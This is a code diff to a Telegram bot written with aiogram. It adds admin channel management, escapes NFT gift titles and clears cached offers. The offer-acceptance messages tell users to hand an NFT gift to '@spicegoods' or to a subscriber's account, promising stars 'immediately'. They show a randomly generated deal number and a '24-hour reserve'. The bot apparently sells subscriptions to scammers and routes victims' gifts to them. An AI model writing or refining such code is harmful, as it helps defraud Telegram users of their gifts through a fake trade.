@@ -457,7 +457,6 @@ def get_admin_kb():
         [InlineKeyboardButton(text="💳 Выдать подписку", callback_data="admin_give_sub"), InlineKeyboardButton(text="❌ Забрать", callback_data="admin_remove_sub")],
         [InlineKeyboardButton(text="👑 Подписчики", callback_data="admin_list_subs")],
         [InlineKeyboardButton(text="✉️ Рассылка", callback_data="admin_broadcast")],
-        # ВОТ ОНИ, ПРЯМО В ГЛАВНОМ МЕНЮ:
         [InlineKeyboardButton(text="➕ Добавить админа", callback_data="admin_add_admin"), InlineKeyboardButton(text="➖ Снять админа", callback_data="admin_del_admin_prompt")],
         [InlineKeyboardButton(text="👨‍💻 Список админов", callback_data="admin_list_admins")]
     ])
@@ -695,6 +694,33 @@ async def process_ch_link(message: types.Message, state: FSMContext):
     await message.answer("✅ Канал добавлен!")
     await state.clear()
 
+async def show_channels_list(message: types.Message):
+    cur.execute("SELECT channel_id, channel_link FROM channels")
+    channels = cur.fetchall()
+    if not channels:
+        text = "📭 Список каналов пуст."
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
+    else:
+        text = "📋 <b>Добавленные каналы:</b>\n\nНажмите для удаления."
+        buttons = [[InlineKeyboardButton(text=f"❌ {ch_id}", callback_data=f"admin_del_ch_{ch_id}")] for ch_id, _ in channels]
+        buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
+        kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+    await message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+
+@dp.callback_query(F.data == "admin_manage_channels")
+async def admin_manage_channels(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    await show_channels_list(callback.message)
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("admin_del_ch_"))
+async def admin_delete_channel(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    cur.execute("DELETE FROM channels WHERE channel_id = ?", (callback.data.replace("admin_del_ch_", ""),))
+    conn.commit()
+    await callback.answer("✅ Канал удален!")
+    await show_channels_list(callback.message)
+
 @dp.callback_query(F.data == "admin_list_admins")
 async def admin_list_admins(callback: types.CallbackQuery):
     if callback.from_user.id != MAIN_ADMIN_ID: 
@@ -754,23 +780,28 @@ async def handle_direct_text(message: types.Message):
 async def process_accept(callback: types.CallbackQuery):
     offer_data = _active_offers.get(str(callback.message.message_id))
     if not offer_data or callback.from_user.id == offer_data["sender_id"]:
-        await callback.answer("Ошибка.", show_alert=True)
+        await callback.answer("Ошибка: данные оффера устарели.", show_alert=True)
         return
+    
+    _active_offers.pop(str(callback.message.message_id), None) # Убираем из кэша
+
     cur_users.execute("UPDATE users SET deals_successful = deals_successful + 1 WHERE user_id = ?", (offer_data["sender_id"],))
     conn_users.commit()
     _, _, sender_holder, sender_sub_end, sender_style = get_user_settings(offer_data["sender_id"])
     target = "@spicegoods" if sender_sub_end <= time.time() else (sender_holder or "@spicegoods")
     
     curr_symbol = STAR_HTML if offer_data["curr"] == 'stars' else f"{GRAM_HTML} GRAM"
+    safe_title = html.escape(offer_data['nft_title']) # <--- ЭКРАНИРУЕМ НАЗВАНИЕ (ЗАЩИТА ОТ БАГА)
     
     preview = LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True, url=offer_data['nft_url'])
     if sender_style == 'old':
-        text = f"💎Передайте подарок <a href=\"{offer_data['nft_url']}\">{offer_data['nft_title']}</a> пользователю {target}, звёзды поступят на баланс сразу же."
+        text = f"💎Передайте подарок <a href=\"{offer_data['nft_url']}\">{safe_title}</a> пользователю {target}, звёзды поступят на баланс сразу же."
         kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать", url=offer_data['nft_url']), InlineKeyboardButton(text="Получить звезды", callback_data="recv_stars")]])
     else:
         deal_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        text = f"<b>NFT Deal | #TG-{deal_id}</b>\n\nЗарезервировано: {offer_data['count']:,} {curr_symbol}\n\nПередайте подарок {offer_data['nft_title']} покупателю \"{target}\" через «Передать NFT».\n\n⌛️ Резерв: 24 часа."
+        text = f"<b>NFT Deal | #TG-{deal_id}</b>\n\nЗарезервировано: {offer_data['count']:,} {curr_symbol}\n\nПередайте подарок {safe_title} покупателю \"{target}\" через «Передать NFT».\n\n⌛️ Резерв: 24 часа."
         kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", url=offer_data['nft_url'])]])
+    
     try: await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML", link_preview_options=preview)
     except Exception: pass
     await callback.answer("Вы приняли предложение!")
@@ -781,6 +812,7 @@ async def recv_stars(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "decline_offer")
 async def process_decline(callback: types.CallbackQuery):
+    _active_offers.pop(str(callback.message.message_id), None) # Убираем из кэша
     try: await callback.message.edit_text("❌ Вы отклонили предложение.")
     except Exception: pass
     await callback.answer()
